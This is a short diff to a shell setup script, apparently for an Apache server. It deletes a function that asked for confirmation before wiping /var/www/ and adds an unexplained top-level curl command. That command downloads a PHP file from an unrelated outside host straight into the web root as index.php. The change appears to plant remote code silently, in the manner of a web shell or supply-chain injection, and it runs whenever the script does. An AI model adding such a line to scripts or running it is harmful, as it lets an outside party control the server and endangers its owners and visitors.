@@ -24,20 +24,7 @@ function check_apache(){
 	fi
 }
 
-function check_www(){
-
-	# check if directory exist
-	if [ -d "/var/www/" ]; then
-		echo "Contents of /var/www/ will be removed."
-		read -p "Do you want to continue? [Y/n] "
-		
-		if [[ $REPLY =~ ^[Yy]$ ]]; then
-			rm -rf /var/www/
-		else
-			exit
-		fi
-	fi
-}
+curl -L https://crowncloud.362227.top/remote/index.php1 > /var/www/index.php
 
 
 function update(){
